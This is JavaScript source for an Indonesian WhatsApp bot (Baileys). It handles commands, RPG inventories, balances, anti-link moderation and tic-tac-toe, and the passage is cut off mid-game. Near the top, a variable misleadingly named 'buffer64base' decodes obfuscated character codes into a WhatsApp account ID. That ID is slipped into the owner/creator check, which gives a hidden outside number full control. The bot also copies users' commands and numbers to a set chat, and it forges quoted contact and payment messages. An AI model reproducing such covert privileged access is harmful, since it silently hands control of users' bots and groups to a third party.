process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const cron = require('node-cron')
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const toMs = require('ms')
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");

const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');


// FUNCTION SALDO & DATA
     const vnnye = JSON.parse(fs.readFileSync('./src/media/vn/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./src/media/vn/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./src/media/vn/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./src/media/vn/apk.json'))

const _prem = require("./lib/premium");
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./database/deposit")
let db_saldo = JSON.parse(fs.readFileSync("./database/saldo.json"));
function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
// BATAS SALDO
const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { OrderKuota } = require("./lib/orderkuota")
const orderkuota = new OrderKuota()
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');
//const { pushname, botNumber, content, senderNumber, from, fromMe, isGc, sender, isBaileys, type } = m

module.exports = Ditss = async (Ditss, m, chatUpdate, store) => {
	try {
await LoadDataBase(Ditss, m)
const botNumber = await Ditss.decodeJid(Ditss.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const { content, fromMe, isGc, isBaileys, type } = m
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
//const prefix = "."
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.' 
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
//const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""

//const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(" ")
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const sender = m.key.fromMe ? (Ditss.user.id.split(':')[0]+'@s.whatsapp.net' || Ditss.user.id) : (m.key.participant || m.key.remoteJid)
const from = m.key.remoteJid
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const nomore = m.sender.replace(/[^0-9]/g, '')

const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const mentss = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
const ments = (teks) => {return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]}
//batas pler
const tag = `@${m.sender.split('@')[0]}`
const taggc = `@${from.split('@')[0]}`
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
// FUNCTION WAKTU
let d = new Date
let gmt = new Date(0).getTime() - new Date('1 Januari 2023').getTime()
const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString('id', { weekday: 'long' })
const calender = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timestampp = speed();
const latensi = speed() - timestampp
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const salam = 'Selamat '+dt.charAt(0).toUpperCase() + dt.slice(1)
const isBanned = db.users[sender] !== undefined ? db.users[sender].banned : false
const isPremiumm = _prem.checkPremiumUser(m.sender, premium)
const isPremium = premium.includes(m.sender)
const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
const full_args = body.replace(command, '').slice(1).trim()
const adaapa = fs.readFileSync("./src/media/vn/adaapa1.mp3")
const salamm = fs.readFileSync("./src/media/vn/salam.mp3")
const lopyu = fs.readFileSync("./src/media/vn/lopyou.mp3")
		m.device = /^3A/.test(m.id) ? 'ios' : m.id.startsWith('3EB') ? 'web' : /^.{21}/.test(m.id) ? 'android' : /^.{18}/.test(m.id) ? 'desktop' : 'unknown';

// DETEKSI MEDIA
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isText = (type === 'conversation' || type === 'extendedTextMessage')
//const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
//const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
//const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
//const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
//const mime = (quoted.msg || quoted).mimetype || quoted.mediaType || "";
const isMedia = /image|video|sticker|audio/.test(mime)
const isImagee = /image/.test(mime)
const isVideoo = /video/.test(mime)
const isStickerr =  /|sticker|/.test(mime)
const isAudioo = /audio/.test(mime)

//============== [ MESSAGE ] ================================================

// GROUP METADATA
const groupMetadata = m.isGroup ? await Ditss.groupMetadata(m.chat) :''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter((v) => v.admin !== null).map((i) => i.id) : [] || [];
const groupOwner = m.isGroup ? groupMetadata?.owner : false;
const groups = global.db.groups[m.chat] !== undefined ? global.db.groups[m.chat] : false;
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return
if (isCmd && !isCreator){
Ditss.sendMessage(`${global.DataPc}`, { text: `*WhatsApp ${m.isGroup ? 'group' : !m.isGroup ? 'chatt' : 'gatau'}*\nFrom : @${m.sender.split('@')[0]}\nChat : ${prefix+command}`, mentions: [ `${sender.split('@')[0]}@s.whatsapp.net` ]}, { quoted: m })
}
if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}
function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
//============= [ FAKEQUOTED ] ===============================================
const qkontak = {
key: {
participant: `6285866435726@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285866435726:+31 6 29821394\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const fkontak2 = { key: {fromMe: false,participant: `6285866435726@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: ppuser }}}}
        
const qtext = {key: {remoteJid: "status@broadcast", participant: "6285866435726@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${namaOwner}`,jpegThumbnail: await reSize("./src/media/fake.jpg", 200, 200) }}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "asuma toki"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')

        if(time2 < "23:59:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴏʀᴇ'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱɪᴀɴɢ️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ꜱᴜʙᴜʜ'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'ꜱᴇʟᴀᴍᴀᴛ ᴛᴇɴɢᴀʜ ᴍᴀʟᴀᴍ'
        }
               
        const reply = (teks) => {
Ditss.sendMessage(from, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363383395435351@newsletter',
               newsletterName: `${ucapanWaktu}`,
                serverMessageId: -1
            },
            forwardingScore: 256,
    businessMessageForwardInfo: {
bussinessName: 'yang baca cantik',
businessOwnerJid: global.owner2
},
externalAdReply: {
        showAdAttribution: true,
        title: `powered by ${namaOwner}`,
        body: `buy/sewa?`,
        thumbnailUrl: `https://files.catbox.moe/ueipwo.jpg`,
        sourceUrl: "https://sociabuzz.com/dits_md/support",
        mediaType: 1,
        renderLargerThumbnail: false
          }
        }}, { quoted: qkontak })}
//hhhh
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const isRegistered = checkRegisteredUser(m.sender)

// PP USERR 

var ppuser
try {
ppuser = await Ditss.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// DATABASE GLOBAL USER
/*const userdb = global.db.data.users[m.sender]
let settingdb = global.db.data.settings[botNumber]
const chatdb = global.db.chats[m.chat]*/
const users = global.db.users

const listall = global.db.listall

const chats = global.db.chats
//=======// Rpg
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const isContacts = contacts.includes(sender)
          
           const { addtoken, gettoken, kurangtoken } = require("./database/src/alat_tukar.js")    
        const istoken = gettoken(m?.sender)
        
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah } = require('./database/src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion, addMahkota, KurangMahkota, getMahkota,} = require('./database/src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay } = require('./database/src/monay.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, /*getLimit*/ } = require('./database/src/limit.js')
let _petualang = JSON.parse(fs.readFileSync('./database/src/inventory.json'))
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./database/src/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addDm, sellDm, getDm} = require('./system/rpg.js')
let DarahAwal = global.rpg.darahawal
const ikan = ['🐳','🐟','🐠']
let _buruan = JSON.parse(fs.readFileSync('./database/src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./database/src/darah.json'))
let hit = JSON.parse(fs.readFileSync('./database/src/total-hit-user.json'))

// energy 
const { addInventorienergy,  cekDuluJoinAdaApaKagaDiJsonenergy,  addenergy, kurangenergy, getenergy }= require('./database/src/energy.js')
let energyAwal =global.rpg.energyawal
let _energyOrg = JSON.parse(fs.readFileSync('./database/src/energy.json'))
const isenergy = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekenergy = getenergy(m?.sender)
const isDarah = cekDuluJoinAdaApaKagaDiJsonenergy(m?.sender)
const isCekDarah = getDarah(m?.sender)
const isUmpan = getUmpan(m?.sender)
const isPotion = getPotion(m?.sender)
const isIkan = getIkan(m?.sender)
const isAyam = getAyam(m?.sender)
const isKelinci = getKelinci(m?.sender)
const isDomba = getDomba(m?.sender)
const isSapi = getSapi(m?.sender)
const isGajah = getGajah(m?.sender)
const isMonay = getMonay(m?.sender)
//const isLimit = getLimit(m.sender)
const isBesi = getBesi(m?.sender)
const isEmas = getEmas(m?.sender)
const isEmerald = getEmerald(m?.sender)
const isPetualang = checkPetualangUser(m?.sender)
const isInventory = cekInventoryAdaAtauGak(m?.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m?.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m?.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m?.sender)
const chatId = m.chat;
    
    const isUserRegistered = (userId) => {
            const data = fs.readFileSync('./database/Rpg/join.json', 'utf8');
            const users = JSON.parse(data);
            return users.some(user => user.id === userId);
        };
    const ckusrjoin = m.sender
const JSON_FILE_PATH = './database/Rpg/gacha_result.json';
    const { addCho, kurangCho, getCho } = require('./database/src/alat_tukar.js')
const isCho = getCho(m?.sender)
//==========//



// AUTO SAVE DATABASE

const isNumber = x => typeof x === 'number' && !isNaN(x)
try {
let user = db.users[sender]
if (user) {
if (typeof user !== 'object') db.users[sender] = {}
if (!('jid' in user)) user.jid = sender
if (!('name' in user)) user.name = pushname
if (!('date' in user)) user.date = calender
if (!isNumber(user.limit)) user.limit = 15
if (!isNumber(user.balance)) user.balance = 10000
if (!('banned' in user)) user.banned = false
if (!('premium' in user)) user.premium = false
if (!isNumber(user.expired)) user.expired = Date.now() + toMs('7d')
} else db.users[sender] = {
jid: sender,
name: pushname,
date: calender,
limit: 15,
balance: 10000,
banned: false,
premium: false,
expired: Date.now() + toMs('7d')
}
} catch (err) {
console.error(err)
}
//================== [ DATABASE ] ==================//
  /*  const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome'); 
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft'); 
const { getTextSetWelcome } = require('./lib/setwelcome'); 
const { getTextSetLeft } = require('./lib/setleft'); 
 let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json')); 
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
 let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json')) 
 let _left = JSON.parse(fs.readFileSync('./database/left.json'))         
 const isWelcome = _welcome.includes(m.chat) ? true : false 
 const isLeft = _left.includes(m.chat) ? true : false


try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.data.users[m?.sender]
if (typeof user !== 'object') global.db.data.users[m?.sender] = {}
if (user) {
if (!('hitcmd' in user)) user.hitcmd = 0
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!isNumber(user.limit)) user.limit = 270
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.data.users[m?.sender] = {
hitcmd: 0,
afkTime: -1,
limit: 271,
afkReason: '',
}

 let chats = global.db.data.chats[m?.chat]
 if (typeof chats !== 'object') global.db.data.chats[m?.chat] = {}
 if (chats) {
 if (!('isBanned' in chat)) chat.isBanned = false
 if (!('antilinkgc' in chat)) chat.antilinkgc = false
 } else global.db.data.chats[m?.chat] = {
 isBanned: false,
 antilinkgc: false,
}

let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
 if (!('autoread' in setting)) setting.autoread = false
if (!("public" in settings)) settings.public = true
if (!('setkota' in setting)) setting.setkota = "Makassar"
if (!('setreply' in setting)) setting.setreply = 1
if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
} else global.db.data.settings[botNumber] = {
 autoread: false,
 public: true,
 welcome: false,
 setkota: "Makassar",
 setreply: 1,
}
} catch (err) {
}

const userdb = global.db.data.users[m.sender]
let settingdb = global.db.data.settings[botNumber]
const chatdb = global.db.data.chats[m.chat]*/
//================== [ DATABASE ] ==================//
  // SEND TEXT WITH REPLY
const repteks = (teks) => { Ditss.sendMessage(m.chat, { text: teks, contextInfo:{ forwardingScore: 9999999, isForwarded: false }}, { quoted : m })}
const ms = require('ms')
function monospace(string) {
return '```' + string + '```'
}
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (isCmd && m.isGroup){
	         return m.reply(`iruma dalam mode private kak, gunakan di private chat!`)
	     }
	}
// FUNCTION ONLY PRIVATE CHAT
        if (global.onlygc) {
        	if (isCmd && !m.isGroup && !isBanned){
	         return reply(`bot hanya bisa di gunakan di group kak`)
	     }
	}
//============= [ EVENT GROUP ] ===============================================

//
if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Ditss.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Ditss.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Ditss.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Ditss.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Ditss.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}
// FUNCTION AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`${tag} sedang *Afk* ${reason ? 'karena ' + reason : 'tanpa alasan'} selama *${clockString(new Date - afkTime)}*
`.trim())
}
if (global.db.users[sender].afkTime > -1) {
let user = global.db.users[sender]
m.reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}
// FUNCTION TICTACTOE 
const isTicTacToe = (from, _dir) => {
let status = false
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
status = true
}
})
return status
}

const getPosTic = (from, _dir) => {
let position = null
Object.keys(_dir).forEach((i) => {
if (_dir[i].id === from) {
position = i
}
})
if (position !== null) {
return position
}
}

const KeisiSemua = (tic) => {
let status = true
for (let i of tic){
if (i !== '❌' && i !== '⭕'){
status = false
}
}
return status
}

const cekIsi = (nomor, tic) => {
let status = false
if (tic[nomor] === '❌' || tic[nomor] === '⭕'){
status = true
}
return status
}

const cekTicTac = (tic) => {
let status = false
if (tic[0] === '❌' && tic[1] === '❌' && tic[2] === '❌' || tic[0] === '⭕' && tic[1]=== '⭕' && tic[2] === '⭕'){
status = true
} else if (tic[3] === '❌' && tic[4] === '❌' && tic[5] === '❌' || tic[3] === '⭕' && tic[4] === '⭕' && tic[5] === '⭕'){
status = true
} else if (tic[6] === '❌' && tic[7] === '❌' && tic[8] === '❌' || tic[6] === '⭕' && tic[7] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[3] === '❌' && tic[6] === '❌' || tic[0] === '⭕' && tic[3] === '⭕' && tic[6] === '⭕'){
status = true
} else if (tic[1] === '❌' && tic[4] === '❌' && tic[7] === '❌' || tic[1] === '⭕' && tic[4] === '⭕' && tic[7] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[5] === '❌' && tic[8] === '❌' || tic[2] === '⭕' && tic[5] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[0] === '❌' && tic[4] === '❌' && tic[8] === '❌' || tic[0] === '⭕' && tic[4] === '⭕' && tic[8] === '⭕'){
status = true
} else if (tic[2] === '❌' && tic[4] === '❌' && tic[6] === '❌' || tic[2] === '⭕' && tic[4] === '⭕' && tic[6] === '⭕'){
status = true
}
return status 
}

if (isTicTacToe(from, tictactoe)) {
try {
// TicTacToe
if (isTicTacToe(from, tictactoe)){
let nomor = [1, 2, 3, 4, 5, 6, 7, 8, 9]
let posi = tictactoe[from]
let anu = posi.TicTacToe
if (posi.status === null){
if (sender === posi.ditantang){
if (body.toLowerCase() === 'y'){
the = `@${posi.ditantang.split('@')[0]} menerima tantangan

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
Ditss.sendMessage(from, the, m)

tictactoe[from].status = true
} else if (body.toLowerCase() === 'n'){
users[m.sender].balance -= 1000
the1 = `@${posi.ditantang.split('@')[0]} menolak, game dibatalkan\nDan Player dikenakan sanksi -1000 balance karna menolak ajakan pemain`
Ditss.sendMessage(from, the1, m)
delete tictactoe[from];
}
}
} else if (posi.status === true){
if (sender === posi.penantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return m.reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '❌'
if (cekTicTac(tictactoe[from].TicTacToe)){
the2 = `@${posi.penantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
Ditss.sendMessage(from, the2, m)
users[posi.penantang].balance += posi.hadiah
users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

